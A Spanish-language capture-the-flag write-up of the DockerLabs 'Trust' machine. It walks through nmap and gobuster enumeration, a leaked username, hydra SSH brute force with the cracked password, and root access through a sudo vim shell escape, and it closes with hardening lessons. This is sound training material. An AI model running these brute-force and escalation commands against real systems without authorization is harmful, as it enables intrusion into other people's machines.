# DockerLabs — Trust 🐳

Writeup / walkthrough de la máquina **Trust** de la plataforma **DockerLabs**. El objetivo es obtener acceso inicial mediante fuerza bruta de credenciales SSH y escalar privilegios a `root` explotando un binario mal configurado en `sudo`.

---

## 🧰 Herramientas utilizadas

- `nmap` — escaneo de puertos y detección de servicios
- `gobuster` — fuerza bruta de directorios web
- `hydra` — fuerza bruta de credenciales SSH
- `vim` (GTFOBins) — escalada de privilegios

## 📋 Datos de la máquina

| Campo | Valor |
|---|---|
| IP | `172.17.0.2` |
| Sistema Operativo | Linux (TTL 64) |
| Nombre | Trust |
| Plataforma | DockerLabs |

---

## 1. Reconocimiento

### Ping inicial

Se confirma que el host está activo y se identifica el sistema operativo por el TTL de respuesta (64 → Linux).

### Escaneo inicial con Nmap (todos los puertos)

```bash
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oN AllPorts
```

![Escaneo inicial de puertos](screenshots/01.png)

**Puertos encontrados:**

| Puerto | Servicio |
|---|---|
| 22 | SSH |
| 80 | HTTP |

### Descubrimiento de versiones

```bash
nmap -sCV -p22,80 172.17.0.2
```

![Detección de versiones de servicios](screenshots/02.png)

Se identifica `OpenSSH 9.2p1` en el puerto 22 y un servidor `PHP cli server 5.5+` en el puerto 80.

---

## 2. Enumeración web

### Sitio alojado en el puerto 80

![Página web principal](screenshots/03.png)

### Revisión del código fuente

Se inspecciona el código fuente de la página en busca de comentarios, rutas o credenciales filtradas.

![Revisión de código fuente](screenshots/04.png)

No se encontró información relevante a simple vista.

### Fuzzing de directorios con Gobuster

```bash
gobuster dir -u http://172.17.0.2 \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -x php,html,txt,log,zip,bak,py,rb \
  -t 200 --exclude-length 10701
```

> Se agrega `--exclude-length 10701` porque el servidor devolvía múltiples falsos positivos con código `200`, lo que generaba ruido/errores en el escaneo.

![Error inicial de Gobuster por falsos positivos](screenshots/05.png)

Tras filtrar por longitud de respuesta, se identifica un directorio de interés:

![Directorio secret.php encontrado](screenshots/06.png)

📁 **`secret.php`**

---

## 3. Explotación — Acceso inicial

Al acceder a `secret.php`, la aplicación revela un nombre propio en el saludo de la página:

![Contenido de secret.php](screenshots/07.png)

```
Hola Mario,
Esta web no se puede hackear.
```

Esto entrega una pista clara: **`mario`** como posible nombre de usuario válido para SSH.

### Fuerza bruta de credenciales SSH con Hydra

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -I
```

![Ataque de fuerza bruta con Hydra](screenshots/08.png)

✅ **Credenciales encontradas:**

```
usuario: mario
password: chocolate
```

### Conexión por SSH

```bash
ssh mario@172.17.0.2
```

![Acceso SSH exitoso](screenshots/09.png)

Acceso exitoso a la máquina como usuario `mario`.

---

## 4. Escalada de privilegios

### Verificación de permisos sudo

```bash
sudo -l
```

![Permisos sudo del usuario mario](screenshots/10.png)

El usuario `mario` puede ejecutar `/usr/bin/vim` como `root` sin restricciones:

```
User mario may run the following commands on trust:
    (ALL) /usr/bin/vim
```

### Explotación vía GTFOBins

`vim` permite ejecutar comandos de shell desde su modo de comandos, lo que posibilita la escalada de privilegios cuando se ejecuta con `sudo`:

```bash
sudo /usr/bin/vim
```

![Ejecución de vim con privilegios sudo](screenshots/11.png)

Dentro del editor:

![Vim abierto con privilegios de root](screenshots/12.png)

```vim
:!/bin/bash
```

Este comando genera una shell interactiva heredando los privilegios de `root`.

### Verificación de acceso root

```bash
whoami
```

![Confirmación de acceso root](screenshots/13.png)

✅ **`root`** — privilegios escalados con éxito. Máquina completada.

---

## 📌 Conclusiones

- La enumeración de directorios web con **Gobuster** fue clave para descubrir `secret.php`, una página con información sensible expuesta (nombre de usuario) sin ninguna autenticación.
- La contraseña del usuario `mario` era débil y estaba presente en diccionarios comunes (`rockyou.txt`), lo que permitió el acceso vía fuerza bruta con **Hydra**.
- El permiso `sudo` sobre `/usr/bin/vim` sin restricciones es una mala práctica de configuración crítica: `vim` está catalogado en **GTFOBins** como binario explotable para escalada de privilegios mediante `:!/bin/bash`.
- **Lecciones de seguridad:**
  - No exponer nombres de usuario ni pistas en páginas públicas.
  - Aplicar políticas de contraseñas fuertes y evitar contraseñas presentes en diccionarios conocidos.
  - Aplicar el principio de mínimo privilegio en las reglas de `sudoers`; evitar otorgar acceso a binarios interactivos (editores, paginadores, intérpretes) capaces de generar una shell.

---

## 🏷️ Categoría

`Web Enumeration` · `Brute Force` · `SSH` · `Privilege Escalation` · `GTFOBins` · `DockerLabs`
